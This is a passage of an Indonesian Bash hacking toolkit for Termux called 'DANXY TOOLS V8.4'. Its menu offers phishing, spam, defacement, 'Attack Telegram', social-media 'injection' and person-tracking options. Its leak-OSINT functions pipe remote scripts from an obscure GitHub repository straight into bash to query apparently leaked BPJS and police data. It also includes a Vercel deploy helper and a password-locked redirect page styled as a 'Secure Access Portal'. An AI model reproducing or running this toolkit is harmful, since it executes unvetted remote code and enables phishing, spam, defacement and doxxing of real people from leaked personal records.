 │  [  ${RED}16${GREEN}  ]  │ ${YELLOW}LAPORKAN BUG  ${GREEN}          │[  DECODE ] MENU DECODE   │
 │  [  ${RED}17${GREEN}  ]  │ ${YELLOW}MENU TRACKING${GREEN}           │[  DEPLOY ] MENU DEPLOY   │
 │  [  ${RED}18${GREEN}  ]  │ ${YELLOW}MENU OSIN${GREEN}               │[   LEAK  ] MENU LEAKOSINT│
 │  [  ${RED}19${GREEN}  ]  │ ${YELLOW}MENU GHOS TRACK${GREEN}         │                          │
 │  [  ${RED}20${GREEN}  ]  │ ${YELLOW}CHECKER NIK${GREEN}             │                          │
 │  [  ${RED}21${GREEN}  ]  │ ${YELLOW}INFO TOOLS${GREEN}              │                          │ 
 │  [  ${RED}00${GREEN}  ]  │ ${YELLOW}KELUAR${GREEN}                  │                          │
 ├────────────┴─────────────────────────┴──────────────────────────┤
 │                 DANXY TOOLS V8.4 2024 - 2025                    │
 ├─────────────────────────────────────────────────────────────────┤
 ╰─────────────────────────────────────────────────────────────────╯" | lolcat -p 0.7
  #echo -e "${CYAN}"
  #echo "     ╭─══════════════════════════════════─╮"
  #echo "     │    [] ALL MENU DANXY TOOLS []    │"
  #echo "     ╰─══════════════════════════════════─╯"
  #echo -e "${NC}"
   echo -e "  ${GREEN}● ${YELLOW}● ${RED}●"
   echo -e "  ${WHITE}DEVELOPER: ${BG_RED}${YELLOW}DANXY OFFICIAL✓${NC}"
}
clear

main_menu() {
  play_music
  hello
  while true; do
    klik
    banner
    show_menu
    printf "${GREEN}  ┏━[ ${RED}DANXY TOOLS V8.4${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}MENU${YELLOW}${RED}]${NC}${GREEN}\n  ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} " 
        read -r danxy

    case $danxy in
    01|1)
      klik
      suntik_tiktok
      kembali_ke_menu
      sleep 1 &
      loading $! &
      klik
      ;;
    02|2)
     klik
      suntik_ig
      kembali_ke_menu
      klik
      ;;
    03|3)
      klik
      cek_provider
      kembali_ke_menu
      klik
      ;;
    04|4)
      klik
      ascii_art
      kembali_ke_menu
      klik
      ;;
    05|5)
      klik
      perkiraan_cuaca
      kembali_ke_menu
      klik
      ;;
    06|6)
      klik
      browse_web
      kembali_ke_menu
      klik
      ;;
    07|7)
    klik
      cek_status_website
      kembali_ke_menu
      klik
      ;;
    08|8)
    klik
      kalkulator
      kembali_ke_menu
      klik
      ;;
   09|9)
   klik
      deface_mod
      kembali_ke_menu
      klik
      ;;
   10)
   klik
      ip_lookup
      kembali_ke_menu
      klik
      ;;
   11)
   klik
      cek_ip_publik
      kembali_ke_menu
      klik
      ;;
   12)
   klik
      cek_kebocoran_gmail
      kembali_ke_menu
      klik
      ;;
   13)
   klik
      encrypsi
      kembali_ke_menu
      klik
      ;;
   14)
   klik
      lacak_nama
      kembali_ke_menu
      klik
      ;;
   15)
   klik
      lacak_lokasi_nomor
      kembali_ke_menu
      klik
      ;;
   16)
   klik
      lapor_error
      kembali_ke_menu
      klik
      ;;
   17)
   klik
      menu_tracking
      klik
      ;;
   18)
   klik
      menu_Osin
      klik
      ;;
   19)
   klik
      menu_ghostrack
      klik
     ;;
   20)
   klik
      CheckerNik
      kembali_ke_menu
      klik
      ;;
   21)
    klik
     info
     kembali_ke_menu
     klik
   ;;
DOWNLD)
   klik
   downloader_menu
   kembali_ke_menu
   klik
      ;;
  PHISING|phising)
    klik
    phising_menu
    klik
    ;;
  A1|a1)
    OFF_KLIK
    echo -e "${NC}[${GREEN} ✓${NC} ] ${BG_RED}${YELLOW}BERHASIL MEMATIKAN EFEK KLIK${NC}"
    kembali_ke_menu
    ;;
  A2|a2)
    ON_KLIK
    echo -e "${NC}[${GREEN} ✓${NC} ] ${BG_RED}${YELLOW}BERHASIL MENYALAKAN EFEK KLIK${NC}"
    klik
    ;;
  B1|b1) # Opsi untuk stop musik
      klik
      stop_music
      echo -e "${NC}[${GREEN} ✓${NC} ] ${BG_RED}${YELLOW}BERHASIL MEMATIKAN MUSIK${NC}"
      kembali_ke_menu
      klik
      ;;
   B2|b2)
   klik
      play_music
      echo -e "${NC}[${GREEN} ✓${NC} ] ${BG_RED}${YELLOW}BERHASIL MENYALAKAN MUSIK${NC}"
      klik
      ;;
  C1|c1)
     klik
     disableSalah
     echo -e "${NC}[${GREEN} ✓${NC} ] ${BG_RED}${YELLOW}BERHASIL MEMATIKAN EFEK SALAH${NC}"
     klik
      ;;
  C2|c2)
     klik
     enableSalah
     echo -e "${NC}[${GREEN} ✓${NC} ] ${BG_RED}${YELLOW}BERHASIL MENYALAKAN EFEK SALAH${NC}"
     klik
     ;;
BOT|bot)
    klik
    stop_music
    clear
    wa_bot
    kembali_ke_menu
    klik
     ;;
SPAM|spam)
    klik
    menu_spam
    klik
    ;;
SUNTIK|suntik)
   klik
   menu_suntik
   klik
     ;;
  MUSIK|musik)
     klik
     stop_music
     musik_album
     kembali_ke_menu
     play_music
     klik
     ;;
DARK|dark)
    klik
    DarkMenu
    klik
    ;;
ATKTG|atktg)
    klik
    AttackTG
    kembali_ke_menu
    klik
    ;;
DECODE|decode)
    klik
    decode
    klik
    ;;
DEPLOY|deploy)
    klik
    menu_deploy
    kembali_ke_menu
    klik
    ;;
LEAK|leak)
   klik
   menu_leak-osint
   kembali_ke_menu
   klik
    ;;
    00|0)
    klik
      echo -e "${CYAN}TERIMAKASIH SUDAH MENGGUNAKAN TOOLS DANXY.${NC}" | lolcat -p 0.7
      klik
      stop_music # Menghentikan pemutaran musik saat keluar
      exit 0
      ;;
    *)
      echo -e "${RED}INPUT TIDAK VALID!${NC}" | lolcat -p 0.7
      salah
      sleep 3
      ;;
    esac
  done
}


menu_leak-osint() {  
  while true; do
    clear
    echo -e "${GREY}"
    echo -e "
    ██▓    ▓█████ ▄▄▄       ██ ▄█▀ ▒█████    ██████  ██▓ ███▄    █ 
   ▓██▒    ▓█   ▀▒████▄     ██▄█▒ ▒██▒  ██▒▒██    ▒ ▓██▒ ██ ▀█   █ 
   ▒██░    ▒███  ▒██  ▀█▄  ▓███▄░ ▒██░  ██▒░ ▓██▄   ▒██▒▓██  ▀█ ██▒
   ▒██░    ▒▓█  ▄░██▄▄▄▄██ ▓██ █▄ ▒██   ██░  ▒   ██▒░██░▓██▒  ▐▌██▒
   ░██████▒░▒████▒▓█   ▓██▒▒██▒ █▄░ ████▓▒░▒██████▒▒░██░▒██░   ▓██░
   ░ ▒░▓  ░░░ ▒░ ░▒▒   ▓▒█░▒ ▒▒ ▓▒░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░▓  ░ ▒░   ▒ ▒ 
   ░ ░ ▒  ░ ░ ░  ░ ▒   ▒▒ ░░ ░▒ ▒░  ░ ▒ ▒░ ░ ░▒  ░ ░ ▒ ░░ ░░   ░ ▒░
     ░ ░      ░    ░   ▒   ░ ░░ ░ ░ ░ ░ ▒  ░  ░  ░   ▒ ░   ░   ░ ░ 
       ░  ░   ░  ░     ░  ░░  ░       ░ ░        ░   ░           ░ 
╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
│                MENU LEAK OSINT BY DANXYTOOLS V8.4                 │
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
│ [1] LEAK OSINT BPJS CHECKER                                       │
│ [2] LEAK OSINT POLRI CHECKER                                      │
│ [3] LEAK OSINT RUNDOM CHECKER                                     │
│ [0] Exit                                                          │
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯" | lolcat -p 0.7
    printf "${GREEN} ┏━[ ${RED}DANXY TOOLS V8.4${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}PILIH MENU${YELLOW}${RED}]${NC}${GREEN}\n ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} " 
    read -r choice

    case $choice in
      1) menu_bpjsleak ;;
      2) menu_polri ;;
      3) menu_rundom ;;
      0) echo -e "${GREY} KELUAR DARI MENU LEAK OSINT!${NC}"; return ;;
      *) echo -e "${RED_NEON} MASUKAN APA YANG ADA BUKAN NGADA NGADA!${NC}"; sleep 1 ;;
    esac
  done
}

menu_bpjsleak() {
  bash <(curl -sL "https://raw.githubusercontent.com/JSHDBNCIUAXJNIKUEABCIUWENICKU/OAJSNOIASAIUNSXIANUXAIIWQNQINS9WQNXIEN/refs/heads/main/leak-bpjs.sh")
}

menu_polri() {
  bash <(curl -sL "https://raw.githubusercontent.com/JSHDBNCIUAXJNIKUEABCIUWENICKU/OAJSNOIASAIUNSXIANUXAIIWQNQINS9WQNXIEN/refs/heads/main/leak-polri.sh")
}

menu_rundom() {
  bash <(curl -sL "https://raw.githubusercontent.com/JSHDBNCIUAXJNIKUEABCIUWENICKU/OAJSNOIASAIUNSXIANUXAIIWQNQINS9WQNXIEN/refs/heads/main/leak-rundom.sh")
}










menu_deploy() {  
  while true; do
    clear
    echo -e "${GREY}"
    echo -e "        ${GREEN}● ${YELLOW}● ${RED}●                                        ${GREEN}● ${YELLOW}● ${RED}●"
    echo -e "
       ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
       │         MENU ALL MULTIFUNGSI DEPLOYMENT           │
       ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
       ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
       │ [1] DEPLOY VERCEL                                 │
       │ [2] DEPLOY LOCK WEBSITE                           │
       │ [0] Exit                                          │
       ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯" | lolcat -p 0.7
    printf "${GREEN}       ┏━[ ${RED}DANXY TOOLS V8.4${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}PILIH MENU${YELLOW}${RED}]${NC}${GREEN}\n       ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} " 
    read -r choice

    case $choice in
      1) deploy-vercel ;;
      2) deploy-vercel-lock ;;
      0) echo -e "${GREY} KELUAR DARI MENU DEPLOY!${NC}"; return ;;
      *) echo -e "${RED_NEON} MASUKAN APA YANG ADA BUKAN NGADA NGADA!${NC}"; sleep 1 ;;
    esac
  done
}

deploy-vercel() {
clear
echo ""
echo -e "
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │ ██╗░░░██╗███████╗██████╗░░█████╗░███████╗██╗░░░░░ │
  │ ██║░░░██║██╔════╝██╔══██╗██╔══██╗██╔════╝██║░░░░░ │
  │ ╚██╗░██╔╝█████╗░░██████╔╝██║░░╚═╝█████╗░░██║░░░░░ │
  │ ░╚████╔╝░██╔══╝░░██╔══██╗██║░░██╗██╔══╝░░██║░░░░░ │
  │ ░░╚██╔╝░░███████╗██║░░██║╚█████╔╝███████╗███████╗ │
  │ ░░░╚═╝░░░╚══════╝╚═╝░░╚═╝░╚════╝░╚══════╝╚══════╝ │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
  │          AUTO DEPLOY HTML TO VERCEL INSTAN        │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯[ V0.1 ]
" | lolcat -p 0.7
echo -e "   ${GREEN}● ${YELLOW}● ${RED}●"
printf "${GREEN}  ┏━[ ${RED}DANXY TOOLS V8.4${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}MASUKAN PATH FILE HTML${YELLOW}${RED}]${NC}${GREEN}\n  ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} " 
read -r FILE
        
[[ ! -f "$FILE" ]] && echo "[ ∅ ] FILE TIDAK DI TEMUKAN!" && return
echo ""
echo -e "${GREEN}${BOLD}MASUKIN NAMA DOMAIN 8 DIGIT${YELLOW}"
echo -e "${GREEN}${BOLD}CONTOH: danxy-tools-v84"
read -p "NAMA DOMAIN (tanpa .vercel.app): " DOMAIN_BASE

PROJECT_NAME="$DOMAIN_BASE"

CONTENT=$(base64 -w 0 "$FILE")

PAYLOAD=$(cat <<EOF
{
"name": "$PROJECT_NAME",
"target": "production",
"projectSettings": {
"framework": null,
"devCommand": null,
"buildCommand": null,
"outputDirectory": null
},
"files": [
{
"file": "index.html",
"data": "$CONTENT",
"encoding": "base64"
}
]
}
EOF
)

echo "Deploy..."
RESP=$(curl -s -X POST "$API/v13/deployments" \
-H "Authorization: Bearer $VERCEL_TOKEN" \
-H "Content-Type: application/json" \
-d "$PAYLOAD")

DEPLOY_ID=$(echo "$RESP" | jq -r ".id")
RAND_URL=$(echo "$RESP" | jq -r ".url")

[[ -z "$DEPLOY_ID" ]] && echo "❌ Deploy gagal" && echo "$RESP" | jq && return

echo "Menunggu READY..."
while true; do
STATE=$(curl -s "$API/v13/deployments/$DEPLOY_ID" \
-H "Authorization: Bearer $VERCEL_TOKEN" | jq -r ".readyState")
echo "   Status: $STATE"
[[ "$STATE" == "READY" ]] && break
sleep 2
done

COUNTER=0
DOMAIN="$DOMAIN_BASE"

while true; do
ALIAS="${DOMAIN}.vercel.app"

RES=$(curl -s -X POST "$API/v2/aliases" \
-H "Authorization: Bearer $VERCEL_TOKEN" \
-H "Content-Type: application/json" \
-d "{"deploymentId": "$DEPLOY_ID", "domain": "$ALIAS"}")

CODE=$(echo "$RES" | jq -r ".error.code // empty")

[[ -z "$CODE" ]] && FINAL_URL="https://$ALIAS" && break

[[ "$CODE" != "alias_in_use" ]] && FINAL_URL="https://$RAND_URL" && break

COUNTER=$((COUNTER + 1))
DOMAIN="${DOMAIN_BASE}${COUNTER}"
done

echo "URL publik: $ALIAS"
kembali_ke_menu
}


deploy-vercel-lock() {
clear

echo -e "
╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
│ ██╗░░░██╗███████╗██████╗░░█████╗░███████╗██╗░░░░░ │
│ ██║░░░██║██╔════╝██╔══██╗██╔══██╗██╔════╝██║░░░░░ │
│ ╚██╗░██╔╝█████╗░░██████╔╝██║░░╚═╝█████╗░░██║░░░░░ │
│ ░╚████╔╝░██╔══╝░░██╔══██╗██║░░██╗██╔══╝░░██║░░░░░ │
│ ░░╚██╔╝░░███████╗██║░░██║╚█████╔╝███████╗███████╗ │
│ ░░░╚═╝░░░╚══════╝╚═╝░░╚═╝░╚════╝░╚══════╝╚══════╝ │
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
│        AUTO DEPLOY URL LOCK TO VERCEL             │
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
" | lolcat -p 0.7

read -p "TARGET URL (https://...): " TARGET_URL
read -p "PASSWORD LOCK: " LOCK_PASS
read -p "NAMA DOMAIN (tanpa .vercel.app): " DOMAIN_BASE

# Hash password dan URL target
PASS_HASH=$(echo -n "$LOCK_PASS" | sha256sum | awk '{print $1}')
TARGET_HASH=$(echo -n "$TARGET_URL" | base64 | tr -d '\n')
PROJECT_NAME="$DOMAIN_BASE"

HTML=$(cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Secure Access Portal</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

html, body {
  height: 100%;
  overflow: hidden;
  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
}

body {
  min-height: 100vh;
  background: 
    radial-gradient(circle at 0% 0%, #0a0618 0%, transparent 50%),
    radial-gradient(circle at 100% 100%, #0c0822 0%, transparent 50%),
    linear-gradient(135deg, #05050f 0%, #0a0a1a 100%);
  color: #fff;
  display: flex;
  align-items: center;
  justify-content: center;
  perspective: 1200px;
  position: relative;
}

/* Enhanced Cosmic Glow */
.glow-orb {
  position: fixed;
  border-radius: 50%;
  filter: blur(120px);
  animation: cosmic-drift 25s infinite alternate ease-in-out;
  pointer-events: none;
  z-index: -1;
}

.orb-1 {
  width: 600px;
  height: 600px;
  background: radial-gradient(circle, rgba(0, 255, 255, 0.3) 0%, transparent 70%);
  top: -200px;
  left: -200px;
}

.orb-2 {
  width: 700px;
  height: 700px;
  background: radial-gradient(circle, rgba(127, 92, 255, 0.25) 0%, transparent 70%);
  bottom: -250px;
  right: -250px;
  animation-delay: 3s;
}

@keyframes cosmic-drift {
  0%, 100% { transform: translate(0, 0) scale(1); }
  50% { transform: translate(40px, -30px) scale(1.1); }
}

/* Loading Screen */
.loading-screen {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: #05050f;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  z-index: 1000;
  transition: opacity 0.8s ease, visibility 0.8s ease;
}

.loading-screen.hidden {
  opacity: 0;
  visibility: hidden;
}

.loader {
  width: 80px;
  height: 80px;
  border: 4px solid rgba(0, 255, 255, 0.2);
  border-top-color: #00ffff;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin-bottom: 25px;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

.loading-text {
  font-size: 14px;
  letter-spacing: 4px;
  color: rgba(255, 255, 255, 0.8);
  text-transform: uppercase;
}

/* Main Container */
.box-container {
  transform-style: preserve-3d;
  opacity: 0;
  transform: perspective(1000px) rotateX(-10deg) translateY(40px);
  transition: all 1s cubic-bezier(0.23, 1, 0.32, 1);
  width: 100%;
  max-width: 420px;
  padding: 15px;
}

.box-container.visible {
  opacity: 1;
  transform: perspective(1000px) rotateX(0deg) translateY(0);
}

/* Glass Card */
.box {
  position: relative;
  width: 100%;
  padding: 40px 35px;
  border-radius: 24px;
  background: linear-gradient(
    145deg,
    rgba(255, 255, 255, 0.1) 0%,
    rgba(255, 255, 255, 0.05) 100%
  );
  backdrop-filter: blur(25px);
  -webkit-backdrop-filter: blur(25px);
  border: 1px solid rgba(255, 255, 255, 0.15);
  box-shadow: 
    0 40px 80px rgba(0, 0, 0, 0.8),
    inset 0 0 0 1px rgba(255, 255, 255, 0.1);
  transform: translateZ(30px);
  overflow: visible;
}

/* Animated Border */
.box::before {
  content: '';
  position: absolute;
  top: 0;
  left: -100%;
  width: 100%;
  height: 2px;
  background: linear-gradient(90deg, transparent, #00ffff, #7f5cff, transparent);
  animation: border-slide 3s infinite linear;
}

@keyframes border-slide {
  0% { left: -100%; }
  100% { left: 100%; }
}

/* Badge - FIXED POSITION & TEXT */
.badge {
  position: absolute;
  top: -14px;
  left: 50%;
  transform: translateX(-50%);
  padding: 8px 20px;
  font-size: 12px;
  letter-spacing: 1px;
  border-radius: 20px;
  background: linear-gradient(135deg, #00ffff, #4dfcff);
  color: #000;
  font-weight: 700;
  box-shadow: 0 10px 30px rgba(0, 255, 255, 0.4);
  border: 1px solid rgba(255, 255, 255, 0.3);
  white-space: nowrap;
  min-width: 160px;
  text-align: center;
  z-index: 10;
  line-height: 1.2;
}

/* Typography */
h3 {
  margin: 25px 0 12px;
  font-size: 24px;
  letter-spacing: 0.8px;
  background: linear-gradient(135deg, #fff 0%, #a0a0ff 100%);
  -webkit-background-clip: text;
  background-clip: text;
  color: transparent;
  text-align: center;
}

p {
  margin: 0 0 25px;
  font-size: 14px;
  line-height: 1.6;
  opacity: 0.85;
  text-align: center;
  color: rgba(255, 255, 255, 0.9);
}

/* Input Field */
.input-container {
  position: relative;
  margin: 25px 0;
}

.input-container::before {
  content: '🔐';
  position: absolute;
  left: 18px;
  top: 50%;
  transform: translateY(-50%);
  z-index: 1;
  opacity: 0.8;
}

input {
  width: 100%;
  padding: 16px 16px 16px 48px;
  background: rgba(0, 0, 0, 0.4);
  border-radius: 14px;
  border: 1px solid rgba(255, 255, 255, 0.2);
  color: #fff;
  font-size: 15px;
  outline: none;
  transition: all 0.3s ease;
}

input::placeholder {
  color: rgba(255, 255, 255, 0.5);
}

input:focus {
  border-color: #00ffff;
  box-shadow: 
    0 0 0 3px rgba(0, 255, 255, 0.15),
    0 10px 30px rgba(0, 255, 255, 0.2);
  background: rgba(0, 0, 0, 0.6);
}

/* Button */
.button-container {
  margin: 25px 0;
}

button {
  width: 100%;
  padding: 18px;
  border: none;
  border-radius: 14px;
  cursor: pointer;
  font-weight: 700;
  letter-spacing: 1px;
  font-size: 15px;
  color: #000;
  background: linear-gradient(135deg, #00ffff, #4dfcff);
  transition: all 0.3s ease;
}

button:hover {
  transform: translateY(-3px);
  box-shadow: 0 15px 35px rgba(0, 255, 255, 0.4);
}

/* Status Message */
#msg {
  margin: 15px 0;
  padding: 12px;
  border-radius: 12px;
  font-size: 14px;
  text-align: center;
  background: rgba(255, 107, 107, 0.1);
  border: 1px solid rgba(255, 107, 107, 0.2);
  opacity: 0;
  transform: translateY(-10px);
  transition: all 0.3s ease;
}

#msg.show {
  opacity: 1;
  transform: translateY(0);
}

/* Redirect Overlay */
.redirect-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: #050505;
  display: none;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  z-index: 2000;
}

.redirect-overlay.active {
  display: flex;
}

.redirect-icon {
  width: 80px;
  height: 80px;
  margin-bottom: 25px;
  border: 3px solid #00ffff;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 40px;
  color: #00ffff;
}

.redirect-text {
  font-size: 18px;
  color: #00ffff;
  letter-spacing: 2px;
  margin-bottom: 15px;
}

.redirect-countdown {
  font-size: 24px;
  font-weight: bold;
  color: #fff;
}

/* Footer */
.note {
  margin-top: 20px;
  padding-top: 20px;
  font-size: 12px;
  text-align: center;
  opacity: 0.7;
  letter-spacing: 0.5px;
  border-top: 1px solid rgba(255, 255, 255, 0.1);
}

.note strong {
  color: #00ffff;
  font-weight: 700;
}

/* Shake Animation */
@keyframes shake {
  0%, 100% { transform: translateX(0); }
  25% { transform: translateX(-10px); }
  75% { transform: translateX(10px); }
}

/* Responsive */
@media (max-width: 480px) {
  .box {
    padding: 35px 25px;
  }
  
  .box-container {
    padding: 10px;
  }
  
  h3 {
    font-size: 22px;
  }
  
  .badge {
    padding: 7px 18px;
    font-size: 11px;
    min-width: 150px;
  }
}
</style>
</head>

<body>
<!-- Glow Effects -->
<div class="glow-orb orb-1"></div>
<div class="glow-orb orb-2"></div>

<!-- Loading Screen -->
<div class="loading-screen" id="loadingScreen">
  <div class="loader"></div>
  <div class="loading-text">LOADING</div>
</div>

<!-- Redirect Overlay -->
<div class="redirect-overlay" id="redirectOverlay">
  <div class="redirect-icon">✓</div>
  <div class="redirect-text">ACCESS GRANTED</div>
  <div class="redirect-countdown" id="countdown">3</div>
</div>

<!-- Main Container -->
<div class="box-container" id="mainContainer">
  <div class="box">
    <!-- Badge dengan text lengkap -->
    <div class="badge">SECURE PORTAL</div>
    
    <h3>Protected Access</h3>
    <p>This link is protected. Enter password to continue.</p>
    
    <div class="input-container">
      <input type="password" id="pw" placeholder="Enter password" autocomplete="off">
    </div>
    
    <div class="button-container">
      <button onclick="unlock()">UNLOCK ACCESS</button>
    </div>
    
    <div id="msg"></div>
    
    <div class="note">
      Lock URL by <strong>DANXY TOOLS V8.4</strong>
    </div>
  </div>
</div>

<script>
// Global variables
const TARGET_HASH = "$TARGET_HASH";
const PASS_HASH = "$PASS_HASH";

// Initialize
window.addEventListener('load', () => {
  setTimeout(() => {
    document.getElementById('loadingScreen').classList.add('hidden');
    setTimeout(() => {
      document.getElementById('mainContainer').classList.add('visible');
    }, 300);
  }, 1200);
});

// SHA-256 function
async function sha256(t) {
  const b = new TextEncoder().encode(t);
  const h = await crypto.subtle.digest("SHA-256", b);
  return Array.from(new Uint8Array(h)).map(x => x.toString(16).padStart(2, "0")).join("");
}

// Decode base64
function decodeHash(hash) {
  try {
    return atob(hash);
  } catch (e) {
    return null;
  }
}

// Show redirect
function showRedirect() {
  document.getElementById('mainContainer').style.opacity = '0';
  setTimeout(() => {
    document.getElementById('redirectOverlay').classList.add('active');
    
    let count = 3;
    const countdownEl = document.getElementById('countdown');
    const interval = setInterval(() => {
      count--;
      countdownEl.textContent = count;
      if (count <= 0) {
        clearInterval(interval);
        const targetUrl = decodeHash(TARGET_HASH);
        if (targetUrl) {
          window.location.href = targetUrl;
        }
      }
    }, 1000);
  }, 500);
}

// Main unlock function
async function unlock() {
  const v = document.getElementById("pw").value;
  const h = await sha256(v);
  const msg = document.getElementById("msg");
  
  if (h === PASS_HASH) {
    msg.innerText = "✓ Access granted. Redirecting...";
    msg.style.background = "rgba(0, 255, 157, 0.1)";
    msg.style.borderColor = "rgba(0, 255, 157, 0.3)";
    msg.style.color = "#00ff9d";
    msg.classList.add("show");
    
    setTimeout(() => {
      showRedirect();
    }, 800);
  } else {
    msg.innerText = "Wrong password";
    msg.style.background = "rgba(255, 107, 107, 0.1)";
    msg.style.borderColor = "rgba(255, 107, 107, 0.3)";
    msg.style.color = "#ff6b6b";
    msg.classList.add("show");
    
    document.querySelector('.box').style.animation = 'shake 0.5s';
    setTimeout(() => {
      document.querySelector('.box').style.animation = '';
    }, 500);
  }
}

// Enter key support
document.getElementById("pw").addEventListener("keypress", (e) => {
  if (e.key === "Enter") unlock();
});

// Clear message on input
document.getElementById("pw").addEventListener("input", () => {
  const msg = document.getElementById("msg");
  if (msg.classList.contains("show")) {
    msg.classList.remove("show");
  }
});
</script>
</body>
</html>
EOF
)

CONTENT=$(echo "$HTML" | base64 -w 0)

PAYLOAD=$(cat <<EOF
{
  "name":"$PROJECT_NAME",
  "target":"production",
  "projectSettings":{
    "framework":null,
    "buildCommand":null,
    "outputDirectory":null
  },
  "files":[
    {
      "file":"index.html",
      "data":"$CONTENT",
      "encoding":"base64"
    }
  ]
}
EOF
)

echo "[+] Deploying to Vercel..."
RESP=$(curl -s -X POST "$API/v13/deployments" \
-H "Authorization: Bearer $VERCEL_TOKEN" \
-H "Content-Type: application/json" \
-d "$PAYLOAD")

DEPLOY_ID=$(echo "$RESP" | jq -r ".id")
RAND_URL=$(echo "$RESP" | jq -r ".url")

[[ -z "$DEPLOY_ID" || "$DEPLOY_ID" == "null" ]] && echo "[!] DEPLOY FAILED" && echo "$RESP" | jq && return

echo "[+] Waiting deployment ready..."
while true; do
STATE=$(curl -s "$API/v13/deployments/$DEPLOY_ID" \
-H "Authorization: Bearer $VERCEL_TOKEN" | jq -r ".readyState")
echo "    Status: $STATE"
[[ "$STATE" == "READY" ]] && break
sleep 2
done

DOMAIN="$DOMAIN_BASE"
COUNTER=0

while true; do
ALIAS="$DOMAIN.vercel.app"
RES=$(curl -s -X POST "$API/v2/aliases" \
-H "Authorization: Bearer $VERCEL_TOKEN" \
-H "Content-Type: application/json" \
-d "{\"deploymentId\":\"$DEPLOY_ID\",\"domain\":\"$ALIAS\"}")

CODE=$(echo "$RES" | jq -r ".error.code // empty")
[[ -z "$CODE" ]] && break
[[ "$CODE" != "alias_in_use" ]] && break
COUNTER=$((COUNTER+1))
DOMAIN="${DOMAIN_BASE}${COUNTER}"
done

echo
echo "[✓] URL LOCK DEPLOYED"
echo "[✓] PUBLIC LINK : https://$ALIAS"
echo "[✓] TARGET      : $TARGET_URL"
}





decode() {
  # Define colors
  GREY='\033[90m'
  RED_NEON='\033[1;31m'
  NC='\033[0m' # No Color
  
  while true; do
    clear
    echo -e "${GREY}"
    echo -e "
    ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
    │        MENU DECODE ALL PROJECK ENCRYPSI      │
    ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
    ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
    │ [1] DECODE BASE64                            │
    │ [0] Exit                                     │
    ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯" | lolcat -p 0.7
    read -p "$(echo -e "${GREY}PILIH MENU: ${NC}")" choice

    case $choice in
      1) decoder_menu ;;
      0) echo -e "${GREY}Terima kasih!${NC}"; return ;;
      *) echo -e "${RED_NEON}Pilihan tidak valid!${NC}"; sleep 1 ;;
    esac
  done
}

# ASCII Art Function
show_ascii_art() {
  echo -e "${RED_NEON}"
  cat << "EOF"
  ██████╗ ███████╗ ██████╗ ██████╗ ██████╗ ███████╗██████╗ 
  ██╔══██╗██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗
  ██║  ██║█████╗  ██║     ██║   ██║██║  ██║█████╗  ██████╔╝
  ██║  ██║██╔══╝  ██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗
  ██████╔╝███████╗╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║
  ╚═════╝ ╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
  ██████╗ ███████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗
  ██╔══██╗██╔════╝██╔════╝ ██╔════╝██╔═══██╗██╔══██╗██╔════╝
  ██████╔╝█████╗  ██║  ███╗██║     ██║   ██║██║  ██║█████╗  
